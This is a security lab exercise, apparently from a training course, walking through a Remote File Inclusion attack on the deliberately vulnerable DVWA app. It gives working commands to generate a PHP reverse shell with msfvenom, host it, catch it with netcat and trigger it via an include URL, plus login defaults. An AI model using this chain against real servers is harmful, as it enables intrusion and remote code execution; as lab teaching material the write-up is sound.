# Exercise 17: Remote File Inclusion (RFI) Attack using DVWA

## Objective
Exploit an **RFI (Remote File Inclusion)** vulnerability in DVWA to execute a malicious PHP file and gain a **Reverse Shell**.

---

# Attack Flow

```
Create Payload
      ↓
Host Payload
      ↓
Start Netcat Listener
      ↓
Exploit RFI
      ↓
Reverse Shell
      ↓
Run Commands (whoami)
```

---

# Step 1: Start DVWA

- Open **WampServer** (Windows Server).
- Wait until the icon turns **Green**.
- From **Parrot Security**, browse:

```
http://192.168.0.20:8080/dvwa
```

Login:

```
Username: admin
Password: password
```

Set:

```
DVWA Security → Low
```

**Why?**

- Low security does not validate user input.
- Makes RFI exploitation possible.

---

# Step 2: Create Reverse Shell

Generate a PHP reverse shell.

```bash
msfvenom -p php/reverse_php lhost=192.168.0.18 lport=4444 > shell.php
```

### Purpose

Creates a malicious PHP file (`shell.php`) that connects back to the attacker.

---

# Step 3: Host the Payload

```bash
python3 -m http.server 8000
```

### Purpose

Makes `shell.php` accessible over HTTP.

Example:

```
http://192.168.0.18:8000/shell.php
```

---

# Step 4: Start Netcat Listener

Open another terminal.

```bash
nc -lvp 4444
```

### Purpose

Waits for the reverse shell connection.

---

# Step 5: Exploit RFI

Open **File Inclusion** page in DVWA.

Replace the URL with:

```
http://192.168.0.20:8080/dvwa/vulnerabilities/fi/?page=http://192.168.0.18:8000/shell.php
```

Press **Enter**.

### What happens?

- DVWA downloads `shell.php`
- Executes the PHP file
- Reverse shell connects back to Netcat

---

# Step 6: Verify Access

In the Netcat terminal:

```bash
whoami
```

Displays the current user of the target system.

---

# Generate payload

```

---

# Important Concepts

### RFI (Remote File Inclusion)

Application includes a file from a **remote URL** without validation.

Example:

```
?page=http://attacker-ip:8000/shell.php
```

---

### Reverse Shell

Instead of the attacker connecting to the victim,

**Victim connects back to the attacker.**

```
Target
    │
    ▼
Attacker (Netcat)
```

---

# Complete Workflow

```
Attacker
│
├── Create shell.php
│
├── Host shell.php
│
├── Start Netcat
│
└──────────────►
                Target (DVWA)
                     │
                     ▼
           Downloads shell.php
                     │
                     ▼
            Executes payload
                     │
                     ▼
      Reverse Shell to Attacker
                     │
                     ▼
              Run whoami
```

---

# Key Takeaways

- RFI allows remote file execution.
- `msfvenom` creates the payload.
- Python HTTP Server hosts the payload.
- Netcat receives the reverse shell.
- `whoami` confirms successful access.
